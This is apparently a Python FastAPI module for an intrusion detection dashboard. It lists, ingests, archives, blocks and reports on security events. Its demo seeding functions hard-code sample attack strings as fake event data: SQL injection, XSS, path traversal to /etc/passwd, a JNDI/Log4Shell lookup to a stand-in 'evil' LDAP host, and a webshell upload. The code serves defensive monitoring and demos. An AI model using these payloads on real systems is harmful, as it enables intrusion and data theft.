"""IDS management API for review, reporting, and demo workflows."""
from __future__ import annotations

from collections import Counter, defaultdict
from datetime import datetime, timedelta

from fastapi import APIRouter, Depends, HTTPException, Query
from pydantic import BaseModel, Field
from sqlalchemy import func
from sqlalchemy.orm import Session

from ..api.deps import require_roles
from ..config import settings
from ..database import get_db
from ..models.ids_event import IDSEvent
from ..services.ids_ai_analysis import is_llm_available, run_ai_analysis_sync
from ..services.ids_engine import block_ip_windows, unblock_ip_windows
from ..services.ids_ingestion import (
    DEMO_EVENT_ORIGIN,
    REAL_EVENT_ORIGIN,
    SOURCE_CUSTOM_PROJECT,
    SOURCE_EXTERNAL_MATURE,
    SOURCE_TRANSITIONAL_LOCAL,
    TEST_EVENT_ORIGIN,
    apply_source_metadata,
    build_correlation_key,
    build_event_fingerprint,
)

router = APIRouter(prefix="/ids", tags=["ids"])
_admin = require_roles("system_admin")


class ArchiveBatchRequest(BaseModel):
    event_ids: list[int] = []


class UpdateStatusRequest(BaseModel):
    status: str
    review_note: str = ""


class DemoSeedRequest(BaseModel):
    auto_analyze: bool = True


class IngestRawEvidence(BaseModel):
    method: str = ""
    path: str = ""
    query_snippet: str = ""
    body_snippet: str = ""
    user_agent: str = ""
    headers_snippet: str = ""


class IngestEventRequest(BaseModel):
    event_origin: str
    source_classification: str
    detector_family: str
    detector_name: str
    rule_id: str = ""
    rule_name: str = ""
    source_version: str = ""
    source_freshness: str = "unknown"
    occurred_at: datetime
    client_ip: str
    asset_ref: str = ""
    attack_type: str
    severity: str = "medium"
    confidence: int = Field(..., ge=0, le=100)
    event_fingerprint: str = ""
    correlation_key: str = ""
    evidence_summary: str = ""
    raw_evidence: IngestRawEvidence | None = None


@router.get("/events")
def list_ids_events(
    attack_type: str | None = Query(None),
    client_ip: str | None = Query(None),
    blocked: int | None = Query(None),
    archived: int | None = Query(None),
    status: str | None = Query(None),
    event_origin: str | None = Query(None),
    source_classification: str | None = Query(None),
    min_score: int | None = Query(None, ge=0, le=100),
    limit: int = Query(50, ge=1, le=200),
    offset: int = Query(0, ge=0),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    q = _filtered_ids_query(
        db,
        attack_type=attack_type,
        client_ip=client_ip,
        blocked=blocked,
        archived=archived,
        status=status,
        event_origin=event_origin,
        source_classification=source_classification,
        min_score=min_score,
    ).order_by(IDSEvent.created_at.desc())

    total = q.count()
    rows = q.offset(offset).limit(limit).all()
    return {"total": total, "items": [_serialize_ids_event(row) for row in rows]}


@router.get("/stats")
def ids_stats(
    event_origin: str | None = Query(None),
    source_classification: str | None = Query(None),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    q = _filtered_ids_query(
        db,
        event_origin=event_origin,
        source_classification=source_classification,
    )
    total = q.count()
    blocked_count = q.filter(IDSEvent.blocked == 1).count()
    high_risk_count = q.filter(IDSEvent.risk_score >= 70).count()
    by_type = (
        q.with_entities(IDSEvent.attack_type, func.count(IDSEvent.id).label("cnt"))
        .group_by(IDSEvent.attack_type)
        .all()
    )
    by_status = (
        q.with_entities(IDSEvent.status, func.count(IDSEvent.id).label("cnt"))
        .group_by(IDSEvent.status)
        .all()
    )
    by_origin = (
        q.with_entities(IDSEvent.event_origin, func.count(IDSEvent.id).label("cnt"))
        .group_by(IDSEvent.event_origin)
        .all()
    )
    return {
        "total": total,
        "blocked_count": blocked_count,
        "high_risk_count": high_risk_count,
        "by_type": [
            {"attack_type": attack_type, "attack_type_label": _attack_type_label(attack_type), "count": count}
            for attack_type, count in by_type
        ],
        "by_status": [{"status": status or "new", "count": count} for status, count in by_status],
        "by_origin": [{"event_origin": origin or REAL_EVENT_ORIGIN, "count": count} for origin, count in by_origin],
    }


@router.get("/stats/trend")
def ids_stats_trend(
    days: int = Query(7, ge=1, le=90),
    event_origin: str | None = Query(None),
    source_classification: str | None = Query(None),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    start = datetime.utcnow() - timedelta(days=days)
    rows = (
        _filtered_ids_query(
            db,
            event_origin=event_origin,
            source_classification=source_classification,
        )
        .filter(IDSEvent.created_at >= start)
        .all()
    )

    by_date: dict[str, int] = defaultdict(int)
    for row in rows:
        if row.created_at:
            by_date[row.created_at.strftime("%Y-%m-%d")] += 1

    dates: list[str] = []
    counts: list[int] = []
    for idx in range(days):
        day = (datetime.utcnow() - timedelta(days=days - 1 - idx)).strftime("%Y-%m-%d")
        dates.append(day)
        counts.append(by_date.get(day, 0))
    return {"dates": dates, "counts": counts}


@router.post("/events/ingest")
def ingest_ids_event(
    req: IngestEventRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    # Keep external, demo, and transitional signals on one normalized contract.
    allowed_origins = {REAL_EVENT_ORIGIN, DEMO_EVENT_ORIGIN, TEST_EVENT_ORIGIN}
    allowed_sources = {
        SOURCE_EXTERNAL_MATURE,
        SOURCE_CUSTOM_PROJECT,
        SOURCE_TRANSITIONAL_LOCAL,
    }
    event_origin = (req.event_origin or "").strip()
    source_classification = (req.source_classification or "").strip()
    detector_family = (req.detector_family or "").strip()
    detector_name = (req.detector_name or "").strip()
    attack_type = (req.attack_type or "").strip()

    if event_origin not in allowed_origins:
        raise HTTPException(status_code=400, detail=f"Invalid event_origin: {event_origin}")
    if source_classification not in allowed_sources:
        raise HTTPException(status_code=400, detail=f"Invalid source_classification: {source_classification}")
    if not detector_family or not detector_name or not attack_type:
        raise HTTPException(status_code=400, detail="detector_family, detector_name, and attack_type are required")
    if event_origin in {REAL_EVENT_ORIGIN, DEMO_EVENT_ORIGIN} and not (req.event_fingerprint or "").strip():
        raise HTTPException(status_code=400, detail="event_fingerprint is required for real and demo events")
    if req.raw_evidence is None and not (req.evidence_summary or "").strip():
        raise HTTPException(status_code=400, detail="evidence_summary is required when raw_evidence is omitted")

    raw_evidence = req.raw_evidence or IngestRawEvidence()
    method = (raw_evidence.method or "").strip().upper()
    path = (raw_evidence.path or req.asset_ref or "").strip()
    event_fingerprint = (
        (req.event_fingerprint or "").strip()
        or build_event_fingerprint(req.client_ip, method, path, attack_type, req.rule_id)
    )
    correlation_key = (
        (req.correlation_key or "").strip()
        or build_correlation_key(req.occurred_at, req.client_ip, attack_type, detector_name)
    )
    matched = _find_correlated_ingested_event(
        db,
        event_origin=event_origin,
        event_fingerprint=event_fingerprint,
        correlation_key=correlation_key,
        occurred_at=req.occurred_at,
    )

    if matched:
        _merge_ingested_event(
            matched,
            req=req,
            raw_evidence=raw_evidence,
            event_fingerprint=event_fingerprint,
            correlation_key=correlation_key,
        )
        db.commit()
        db.refresh(matched)
        incident = matched
    else:
        incident = IDSEvent(
            client_ip=(req.client_ip or "")[:64],
            attack_type=attack_type,
            signature_matched=((req.rule_name or req.rule_id or req.evidence_summary or attack_type)[:128]),
            method=method[:16],
            path=path[:512],
            query_snippet=(raw_evidence.query_snippet or "")[:500],
            body_snippet=(raw_evidence.body_snippet or "")[:500],
            user_agent=(raw_evidence.user_agent or "")[:512],
            headers_snippet=(raw_evidence.headers_snippet or "")[:1000],
            blocked=0,
            firewall_rule="",
            archived=0,
            status="new",
            review_note="",
            action_taken=f"ingested::{source_classification}",
            response_result="record_only",
            response_detail=((req.evidence_summary or "normalized_ingest")[:1000]),
            risk_score=_severity_to_risk_score(req.severity, req.confidence),
            confidence=int(req.confidence or 0),
            hit_count=1,
            detect_detail=_build_ingested_detect_detail(req, raw_evidence),
        )
        incident.created_at = req.occurred_at
        apply_source_metadata(
            incident,
            event_origin=event_origin,
            source_classification=source_classification,
            detector_family=detector_family,
            detector_name=detector_name,
            source_rule_id=req.rule_id,
            source_rule_name=req.rule_name,
            source_version=req.source_version,
            source_freshness=req.source_freshness,
            occurred_at=req.occurred_at,
            event_fingerprint=event_fingerprint,
            correlation_key=correlation_key,
        )
        db.add(incident)
        db.commit()
        db.refresh(incident)

    return {
        "incident_id": incident.id,
        "correlation_key": incident.correlation_key or correlation_key,
        "linked_event_count": int(incident.hit_count or 1),
        "counted_in_real_metrics": (incident.event_origin or REAL_EVENT_ORIGIN) == REAL_EVENT_ORIGIN,
        "status": incident.status or "new",
    }


@router.put("/events/{event_id}/archive")
def archive_event(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    evt = _get_event_or_404(db, event_id)
    evt.archived = 1
    evt.status = "closed"
    evt.response_result = "success"
    evt.response_detail = "archived_by_operator"
    db.commit()
    return {"code": 200, "message": "Event archived"}


@router.post("/events/{event_id}/analyze")
def analyze_event_ai(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    if not settings.IDS_AI_ANALYSIS:
        raise HTTPException(status_code=400, detail="IDS_AI_ANALYSIS is disabled")
    if not is_llm_available():
        raise HTTPException(status_code=400, detail="No supported LLM configuration is available")
    _get_event_or_404(db, event_id)
    run_ai_analysis_sync(event_id)
    evt = _get_event_or_404(db, event_id)
    return {
        "code": 200,
        "message": "AI analysis completed",
        "ai_risk_level": evt.ai_risk_level or "",
        "ai_analysis": (evt.ai_analysis or "")[:4000],
        "ai_confidence": int(evt.ai_confidence or 0),
        "ai_analyzed_at": evt.ai_analyzed_at.strftime("%Y-%m-%d %H:%M:%S") if evt.ai_analyzed_at else None,
    }


@router.put("/events/{event_id}/status")
def update_event_status(
    event_id: int,
    req: UpdateStatusRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    allowed = {"new", "investigating", "mitigated", "false_positive", "closed"}
    status = (req.status or "").strip()
    if status not in allowed:
        raise HTTPException(status_code=400, detail=f"Invalid status: {status}")
    evt = _get_event_or_404(db, event_id)
    evt.status = status
    evt.review_note = (req.review_note or "")[:2000]
    evt.response_result = "success"
    evt.response_detail = f"status_updated::{status}"
    db.commit()
    return {"code": 200, "message": "Status updated", "status": evt.status}


@router.post("/events/{event_id}/block")
def block_event_ip(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    evt = _get_event_or_404(db, event_id)
    ok, msg = block_ip_windows(evt.client_ip or "")
    if ok:
        evt.blocked = 1
    evt.firewall_rule = msg[:256]
    evt.action_taken = "manual_block" if ok else "manual_block_failed"
    evt.response_result = "success" if ok else "failed"
    evt.response_detail = msg[:1000]
    db.commit()
    return {"code": 200, "message": "Block executed" if ok else f"Block failed: {msg}", "ok": ok, "rule": msg}


@router.post("/events/{event_id}/unblock")
def unblock_event_ip(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    evt = _get_event_or_404(db, event_id)
    ok, msg = unblock_ip_windows(evt.client_ip or "")
    if ok:
        evt.blocked = 0
    evt.action_taken = "manual_unblock" if ok else "manual_unblock_failed"
    evt.response_result = "success" if ok else "failed"
    evt.response_detail = msg[:1000]
    db.commit()
    return {"code": 200, "message": "Unblock executed" if ok else f"Unblock failed: {msg}", "ok": ok}


@router.get("/events/{event_id}/report")
def get_event_report(
    event_id: int,
    force_ai: int = Query(0),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    evt = _get_event_or_404(db, event_id)
    if force_ai == 1 and settings.IDS_AI_ANALYSIS and is_llm_available():
        run_ai_analysis_sync(event_id)
        evt = _get_event_or_404(db, event_id)

    report = {
        "event_id": evt.id,
        "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
        "overview": {
            "time": evt.created_at.strftime("%Y-%m-%d %H:%M:%S") if evt.created_at else "",
            "client_ip": evt.client_ip,
            "attack_type": evt.attack_type,
            "attack_type_label": _attack_type_label(evt.attack_type),
            "method": evt.method,
            "path": evt.path,
            "status": evt.status or "new",
            "event_origin": evt.event_origin or REAL_EVENT_ORIGIN,
            "detector_name": evt.detector_name or "",
        },
        "score": {
            "risk_score": int(evt.risk_score or 0),
            "rule_confidence": int(evt.confidence or 0),
            "hit_count": int(evt.hit_count or 0),
            "ai_risk_level": evt.ai_risk_level or "",
            "ai_confidence": int(evt.ai_confidence or 0),
        },
        "evidence": {
            "signature": evt.signature_matched or "",
            "query_snippet": (evt.query_snippet or "")[:500],
            "body_snippet": (evt.body_snippet or "")[:500],
            "user_agent": (evt.user_agent or "")[:500],
        },
        "response": {
            "blocked": bool(evt.blocked),
            "firewall_rule": evt.firewall_rule or "",
            "action_taken": evt.action_taken or "",
            "review_note": evt.review_note or "",
            "response_result": evt.response_result or "",
            "response_detail": evt.response_detail or "",
        },
        "provenance": {
            "source_classification": evt.source_classification or "",
            "detector_family": evt.detector_family or "",
            "detector_name": evt.detector_name or "",
            "source_rule_id": evt.source_rule_id or "",
            "source_rule_name": evt.source_rule_name or "",
            "source_version": evt.source_version or "",
            "source_freshness": evt.source_freshness or "",
        },
        "ai_analysis": evt.ai_analysis or "",
    }
    markdown = (
        "# IDS Incident Report\n\n"
        f"- Event ID: {evt.id}\n"
        f"- Time: {report['overview']['time']}\n"
        f"- Client IP: {evt.client_ip}\n"
        f"- Type: {_attack_type_label(evt.attack_type)} ({evt.attack_type})\n"
        f"- Origin: {evt.event_origin or REAL_EVENT_ORIGIN}\n"
        f"- Detector: {evt.detector_name or '-'}\n"
        f"- Path: {evt.method} {evt.path}\n"
        f"- Risk Score: {int(evt.risk_score or 0)} / 100\n"
        f"- Confidence: {int(evt.confidence or 0)} / 100\n"
        f"- Hit Count: {int(evt.hit_count or 0)}\n"
        f"- Blocked: {'yes' if evt.blocked else 'no'}\n"
        f"- Firewall Rule: {evt.firewall_rule or '-'}\n\n"
        "## Evidence\n"
        f"- Signature: {evt.signature_matched or '-'}\n"
        f"- Query: {(evt.query_snippet or '-')[:500]}\n"
        f"- Body: {(evt.body_snippet or '-')[:500]}\n"
        f"- User-Agent: {(evt.user_agent or '-')[:300]}\n\n"
        "## AI Analysis\n"
        f"- Risk Level: {evt.ai_risk_level or 'unknown'}\n"
        f"- AI Confidence: {int(evt.ai_confidence or 0)}\n\n"
        f"{evt.ai_analysis or 'No AI analysis available.'}\n"
    )
    return {"report": report, "markdown": markdown}


@router.get("/demo/phase1/aggregate-report")
def get_phase1_aggregate_report(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    rows = (
        db.query(IDSEvent)
        .filter(IDSEvent.action_taken.like("demo_seed_phase1::%"))
        .order_by(IDSEvent.id.asc())
        .all()
    )
    if not rows:
        raise HTTPException(status_code=404, detail="No phase1 demo events found")

    ips = sorted({row.client_ip or "" for row in rows if row.client_ip})
    attack_labels: list[str] = []
    for row in rows:
        label = _attack_type_label(row.attack_type)
        if label not in attack_labels:
            attack_labels.append(label)

    max_score = max(int(row.risk_score or 0) for row in rows)
    max_conf = max(int(row.confidence or 0) for row in rows)
    blocked_count = sum(1 for row in rows if row.blocked)
    total_hits = sum(int(row.hit_count or 0) for row in rows)
    first_time = rows[0].created_at.strftime("%Y-%m-%d %H:%M:%S") if rows[0].created_at else ""
    by_attack = Counter((row.attack_type or "") for row in rows)

    return {
        "report": {
            "kind": "aggregate_phase1",
            "event_id": rows[0].id,
            "event_count": len(rows),
            "attack_type_labels": attack_labels,
            "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
            "overview": {
                "time": first_time,
                "client_ip": ", ".join(ips[:6]) if ips else "-",
                "attack_type": "multi_vector",
                "attack_type_label": "Multi-vector demo chain",
                "method": "GET/POST",
                "path": "multiple endpoints",
                "status": "investigating",
            },
            "score": {
                "risk_score": max_score,
                "rule_confidence": max_conf,
                "hit_count": total_hits,
                "ai_risk_level": "high",
                "ai_confidence": min(99, max(88, max_conf - 2)),
            },
            "evidence": {
                "signature": "aggregate::demo_seed_phase1",
                "query_snippet": f"{len(rows)} demo events across {', '.join(attack_labels)}",
                "body_snippet": "See vector details in report",
                "user_agent": "RedTeam-AutoScanner/1.0",
            },
            "response": {
                "blocked": blocked_count > 0,
                "firewall_rule": f"IDS-Aggregate-{len(rows)}evt",
                "action_taken": "aggregate_investigation",
                "review_note": "Aggregated demo phase1 chain",
            },
            "analysis_json": {
                "report_type": "ids_ai_aggregate",
                "scenario": "multi_vector_concurrent_attack",
                "engine": "IDS_RULE_ENGINE + LLM_ASSIST",
                "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
                "summary": {
                    "total_events": len(rows),
                    "unique_source_ips": len(ips),
                    "peak_risk_score": max_score,
                    "blocked_count": blocked_count,
                    "aggregate_risk_level": "high",
                },
                "attack_families": [
                    {
                        "id": attack_id,
                        "name_zh": _attack_type_label(attack_id),
                        "description": "Aggregated from seeded demo events",
                        "detected": count > 0,
                        "event_count": int(count),
                    }
                    for attack_id, count in by_attack.items()
                ],
            },
            "vectors": [
                {
                    "attack_type": row.attack_type,
                    "attack_type_label": _attack_type_label(row.attack_type),
                    "client_ip": row.client_ip,
                    "method": row.method,
                    "path": (row.path or "")[:200],
                    "risk_score": int(row.risk_score or 0),
                    "blocked": bool(row.blocked),
                }
                for row in rows
            ],
            "ai_analysis": "Demo aggregation report for the phase1 attack chain.",
        }
    }


@router.post("/demo/phase1")
def seed_demo_phase1(
    req: DemoSeedRequest | None = None,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    db.query(IDSEvent).filter(IDSEvent.action_taken.like("demo_seed_phase1::%")).delete(synchronize_session=False)
    db.commit()

    rows = [
        ("sql_injection", "GET", "/api/purchase?kw=1' OR '1'='1", "192.168.31.101", 92, 95, 1, "firewall_block"),
        ("xss", "GET", "/api/trace?keyword=<script>alert(1)</script>", "192.168.31.101", 84, 90, 1, "logical_block_only"),
        ("path_traversal", "GET", "/api/upload/../../etc/passwd", "10.10.0.55", 88, 93, 1, "firewall_block"),
        ("cmd_injection", "POST", "/api/upload/public", "10.10.0.55", 86, 91, 1, "logical_block_only"),
        ("jndi_injection", "GET", "/api/overview/screen?x=${jndi:ldap://evil/a}", "172.20.1.90", 95, 98, 1, "firewall_block"),
        ("prototype_pollution", "POST", "/api/ai/chat", "172.20.1.90", 66, 78, 0, "record_only"),
        ("scanner", "GET", "/.git/config", "45.90.12.8", 59, 73, 0, "record_only"),
        ("scanner", "GET", "/wp-login.php", "45.90.12.8", 74, 81, 1, "logical_block_only"),
    ]

    seeded: list[int] = []
    for attack_type, method, path, ip, score, confidence, blocked, action in rows:
        evt = IDSEvent(
            client_ip=ip,
            attack_type=attack_type,
            signature_matched=f"demo_signature::{attack_type}",
            method=method,
            path=path,
            query_snippet=path.split("?", 1)[-1] if "?" in path else "",
            body_snippet="demo payload from red team automated testing",
            user_agent="RedTeam-AutoScanner/1.0",
            headers_snippet="{'x-demo':'phase1'}",
            blocked=blocked,
            firewall_rule=(f"IDS-Block-{ip.replace('.', '-')}" if blocked else ""),
            archived=0,
            status="investigating",
            review_note="Demo data: automated attack chain",
            action_taken=f"demo_seed_phase1::{action}",
            response_result="success" if blocked else "record_only",
            response_detail=action,
            risk_score=score,
            confidence=confidence,
            hit_count=2 if score >= 80 else 1,
            detect_detail='[{"attack":"demo","source":"seed"}]',
            ai_risk_level=("high" if score >= 85 else ("medium" if score >= 70 else "low")),
            ai_confidence=max(65, confidence - 5),
            ai_analysis=(
                f"Detected demo {_attack_type_label(attack_type)} activity.\n"
                f"Impact: simulated risk score {score}.\n"
                f"Evidence: source_ip={ip}; path={path}.\n"
                "Recommendation: keep demo events isolated from real metrics."
            ),
        )
        evt.created_at = datetime.utcnow()
        evt.ai_analyzed_at = evt.created_at
        apply_source_metadata(
            evt,
            event_origin=DEMO_EVENT_ORIGIN,
            source_classification=SOURCE_CUSTOM_PROJECT,
            detector_family="web",
            detector_name="demo_phase1_seed",
            source_rule_id=f"demo_signature::{attack_type}",
            source_rule_name=attack_type,
            source_version="demo-phase1",
            source_freshness="current",
            occurred_at=evt.created_at,
        )
        db.add(evt)
        db.flush()
        seeded.append(evt.id)

    db.commit()
    if (req.auto_analyze if req else True) and settings.IDS_AI_ANALYSIS and is_llm_available() and seeded:
        run_ai_analysis_sync(seeded[0])
    return {"code": 200, "message": "Phase1 demo events created", "event_ids": seeded}


@router.post("/demo/phase2")
def seed_demo_phase2(
    req: DemoSeedRequest | None = None,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    db.query(IDSEvent).filter(IDSEvent.action_taken.like("demo_seed_phase2::%")).delete(synchronize_session=False)
    db.commit()

    now = datetime.utcnow()
    evt = IDSEvent(
        client_ip="172.16.9.23",
        attack_type="malware",
        signature_matched="demo_malware_upload::webshell",
        method="POST",
        path="/api/upload/public",
        query_snippet="filename=report.jsp",
        body_snippet="multipart/form-data; suspicious webshell payload detected",
        user_agent="Manual-Attack/Browser",
        headers_snippet="{'content-type':'multipart/form-data'}",
        blocked=1,
        firewall_rule="IDS-Block-172-16-9-23",
        archived=0,
        status="mitigated",
        review_note="Demo data: webshell upload interception",
        action_taken="demo_seed_phase2::firewall_block",
        response_result="success",
        response_detail="firewall_block",
        risk_score=97,
        confidence=99,
        hit_count=3,
        detect_detail='[{"attack":"webshell_upload","source":"seed"}]',
        ai_risk_level="high",
        ai_confidence=97,
        ai_analysis=(
            "Detected demo webshell upload event.\n"
            "Impact: simulated high-risk file upload.\n"
            "Evidence: upload endpoint and suspicious payload markers.\n"
            "Recommendation: keep demo file events isolated from real metrics."
        ),
    )
    evt.created_at = now
    evt.ai_analyzed_at = now
    apply_source_metadata(
        evt,
        event_origin=DEMO_EVENT_ORIGIN,
        source_classification=SOURCE_CUSTOM_PROJECT,
        detector_family="file",
        detector_name="demo_phase2_seed",
        source_rule_id="demo_malware_upload::webshell",
        source_rule_name="malware",
        source_version="demo-phase2",
        source_freshness="current",
        occurred_at=now,
    )
    db.add(evt)
    db.commit()
    db.refresh(evt)

    if (req.auto_analyze if req else True) and settings.IDS_AI_ANALYSIS and is_llm_available():
        run_ai_analysis_sync(evt.id)
    return {"code": 200, "message": "Phase2 demo event created", "event_id": evt.id}


@router.post("/demo/reset")
def reset_demo_events(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    deleted = (
        db.query(IDSEvent)
        .filter(IDSEvent.event_origin == DEMO_EVENT_ORIGIN)
        .delete(synchronize_session=False)
    )
    db.commit()
    return {"code": 200, "message": f"Deleted {deleted} demo events", "deleted": deleted}


@router.post("/events/archive-batch")
def archive_batch(
    req: ArchiveBatchRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    event_ids = req.event_ids or []
    if not event_ids:
        return {"code": 200, "message": "No events selected", "archived": 0}
    db.query(IDSEvent).filter(IDSEvent.id.in_(event_ids)).update(
        {
            IDSEvent.archived: 1,
            IDSEvent.status: "closed",
            IDSEvent.response_result: "success",
            IDSEvent.response_detail: "archived_by_batch",
        },
        synchronize_session=False,
    )
    db.commit()
    return {"code": 200, "message": f"Archived {len(event_ids)} events", "archived": len(event_ids)}


def _find_correlated_ingested_event(
    db: Session,
    *,
    event_origin: str,
    event_fingerprint: str,
    correlation_key: str,
    occurred_at: datetime,
) -> IDSEvent | None:
    # Bound correlation to active recent incidents so review stays manageable.
    review_window_start = occurred_at - timedelta(hours=24)
    q = (
        db.query(IDSEvent)
        .filter(IDSEvent.archived == 0)
        .filter(IDSEvent.event_origin == event_origin)
        .filter(IDSEvent.created_at >= review_window_start)
    )
    if event_fingerprint:
        evt = q.filter(IDSEvent.event_fingerprint == event_fingerprint).order_by(IDSEvent.id.desc()).first()
        if evt:
            return evt
    if correlation_key:
        evt = q.filter(IDSEvent.correlation_key == correlation_key).order_by(IDSEvent.id.desc()).first()
        if evt:
            return evt
    return None


def _merge_ingested_event(
    evt: IDSEvent,
    *,
    req: IngestEventRequest,
    raw_evidence: IngestRawEvidence,
    event_fingerprint: str,
    correlation_key: str,
):
    evt.hit_count = int(evt.hit_count or 0) + 1
    evt.risk_score = max(int(evt.risk_score or 0), _severity_to_risk_score(req.severity, req.confidence))
    evt.confidence = max(int(evt.confidence or 0), int(req.confidence or 0))
    evt.signature_matched = (req.rule_name or req.rule_id or evt.signature_matched or "")[:128]
    evt.response_result = evt.response_result or "record_only"
    evt.response_detail = (req.evidence_summary or evt.response_detail or "ingest_correlated")[:1000]
    evt.action_taken = f"ingested::{req.source_classification}::correlated"
    if raw_evidence.method:
        evt.method = raw_evidence.method[:16].upper()
    if raw_evidence.path or req.asset_ref:
        evt.path = (raw_evidence.path or req.asset_ref)[:512]
    if raw_evidence.query_snippet:
        evt.query_snippet = raw_evidence.query_snippet[:500]
    if raw_evidence.body_snippet:
        evt.body_snippet = raw_evidence.body_snippet[:500]
    if raw_evidence.user_agent:
        evt.user_agent = raw_evidence.user_agent[:512]
    if raw_evidence.headers_snippet:
        evt.headers_snippet = raw_evidence.headers_snippet[:1000]
    evt.detect_detail = _build_ingested_detect_detail(req, raw_evidence)
    apply_source_metadata(
        evt,
        event_origin=req.event_origin,
        source_classification=req.source_classification,
        detector_family=req.detector_family,
        detector_name=req.detector_name,
        source_rule_id=req.rule_id,
        source_rule_name=req.rule_name,
        source_version=req.source_version,
        source_freshness=req.source_freshness,
        occurred_at=req.occurred_at,
        event_fingerprint=event_fingerprint,
        correlation_key=correlation_key,
    )


def _severity_to_risk_score(severity: str | None, confidence: int | None) -> int:
    base = {
        "low": 35,
        "medium": 60,
        "high": 82,
        "critical": 96,
    }.get((severity or "").strip().lower(), 60)
    confidence_score = max(0, min(100, int(confidence or 0)))
    return max(base, confidence_score)


def _build_ingested_detect_detail(req: IngestEventRequest, raw_evidence: IngestRawEvidence) -> str:
    summary = (req.evidence_summary or "").strip()
    detail_parts = [
        f"origin={req.event_origin}",
        f"source={req.source_classification}",
        f"detector={req.detector_name}",
        f"rule_id={req.rule_id or '-'}",
        f"rule_name={req.rule_name or '-'}",
        f"severity={req.severity or '-'}",
        f"summary={summary or '-'}",
        f"method={(raw_evidence.method or '').strip().upper() or '-'}",
        f"path={(raw_evidence.path or req.asset_ref or '').strip() or '-'}",
    ]
    return " | ".join(detail_parts)[:4000]


def _filtered_ids_query(
    db: Session,
    *,
    attack_type: str | None = None,
    client_ip: str | None = None,
    blocked: int | None = None,
    archived: int | None = None,
    status: str | None = None,
    event_origin: str | None = None,
    source_classification: str | None = None,
    min_score: int | None = None,
):
    q = db.query(IDSEvent)
    if attack_type:
        q = q.filter(IDSEvent.attack_type == attack_type)
    if client_ip:
        q = q.filter(IDSEvent.client_ip.contains(client_ip))
    if blocked is not None:
        q = q.filter(IDSEvent.blocked == blocked)
    if archived is not None:
        q = q.filter(IDSEvent.archived == archived)
    if status:
        q = q.filter(IDSEvent.status == status)
    if event_origin:
        q = q.filter(IDSEvent.event_origin == event_origin)
    if source_classification:
        q = q.filter(IDSEvent.source_classification == source_classification)
    if min_score is not None:
        q = q.filter(IDSEvent.risk_score >= min_score)
    return q


def _get_event_or_404(db: Session, event_id: int) -> IDSEvent:
    evt = db.query(IDSEvent).filter(IDSEvent.id == event_id).first()
    if not evt:
        raise HTTPException(status_code=404, detail="Event not found")
    return evt


def _attack_type_label(attack_type: str | None) -> str:
    labels = {
        "sql_injection": "SQL Injection",
        "xss": "XSS",
        "path_traversal": "Path Traversal",
        "cmd_injection": "Command Injection",
        "scanner": "Scanner / Probe",
        "malformed": "Malformed Request",
        "jndi_injection": "JNDI / Log4Shell",
        "prototype_pollution": "Prototype Pollution",
        "malware": "Malware / WebShell",
    }
    return labels.get(attack_type or "", attack_type or "-")


def _event_origin_label(origin: str | None) -> str:
    labels = {"real": "Real", "demo": "Demo", "test": "Test"}
    return labels.get((origin or "").strip(), origin or REAL_EVENT_ORIGIN)


def _serialize_ids_event(row: IDSEvent) -> dict:
    return {
        "id": row.id,
        "client_ip": row.client_ip,
        "event_origin": row.event_origin or REAL_EVENT_ORIGIN,
        "event_origin_label": _event_origin_label(row.event_origin),
        "source_classification": row.source_classification or "",
        "detector_family": row.detector_family or "",
        "detector_name": row.detector_name or "",
        "source_rule_id": row.source_rule_id or "",
        "source_rule_name": row.source_rule_name or "",
        "source_version": row.source_version or "",
        "source_freshness": row.source_freshness or "",
        "event_fingerprint": row.event_fingerprint or "",
        "correlation_key": row.correlation_key or "",
        "counted_in_real_metrics": (row.event_origin or REAL_EVENT_ORIGIN) == REAL_EVENT_ORIGIN,
        "attack_type": row.attack_type,
        "attack_type_label": _attack_type_label(row.attack_type),
        "signature_matched": row.signature_matched,
        "method": row.method,
        "path": row.path,
        "query_snippet": (row.query_snippet or "")[:200],
        "body_snippet": (row.body_snippet or "")[:200],
        "user_agent": (row.user_agent or "")[:200],
        "blocked": row.blocked,
        "firewall_rule": row.firewall_rule or "",
        "archived": row.archived,
        "status": row.status or "new",
        "review_note": (row.review_note or "")[:500],
        "action_taken": row.action_taken or "",
        "response_result": row.response_result or "",
        "response_detail": (row.response_detail or "")[:1000],
        "risk_score": int(row.risk_score or 0),
        "confidence": int(row.confidence or 0),
        "hit_count": int(row.hit_count or 0),
        "created_at": row.created_at.strftime("%Y-%m-%d %H:%M:%S") if row.created_at else None,
        "ai_risk_level": row.ai_risk_level or "",
        "ai_analysis": (row.ai_analysis or "")[:2000],
        "ai_confidence": int(row.ai_confidence or 0),
        "ai_analyzed_at": row.ai_analyzed_at.strftime("%Y-%m-%d %H:%M:%S") if row.ai_analyzed_at else None,
    }
